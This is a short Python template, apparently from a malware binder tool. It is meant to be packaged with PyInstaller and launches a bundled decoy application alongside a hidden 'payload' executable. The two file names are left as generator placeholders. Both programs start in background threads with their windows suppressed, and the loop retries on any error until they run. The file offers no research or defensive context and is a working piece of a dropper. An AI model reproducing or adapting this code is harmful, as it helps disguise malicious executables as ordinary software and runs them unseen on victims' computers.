import os
import sys
import subprocess
import threading

launch = True

while launch:
    try:
        folder_app = os.path.join(sys._MEIPASS) if hasattr(sys, "_MEIPASS") else None

        if folder_app is None: continue

        executable_app = os.path.join(folder_app, "${windows.hiddenexe.name_app}")
        executable_payload = os.path.join(
            folder_app, "${windows.hiddenexe.name_payload}"
        )

        threads = []
        if os.path.exists(executable_app):
            thread_app = threading.Thread(
                target=subprocess.run,
                args=[executable_app],
                kwargs={"creationflags": subprocess.CREATE_NO_WINDOW},
            )
            threads.append(thread_app)
        if os.path.exists(executable_payload):
            thread_payload = threading.Thread(
                target=subprocess.run,
                args=[executable_payload],
                kwargs={"creationflags": subprocess.CREATE_NO_WINDOW},
            )
            threads.append(thread_payload)

        for thread in threads: thread.start()
        launch = False
    except Exception as e:
        launch = True
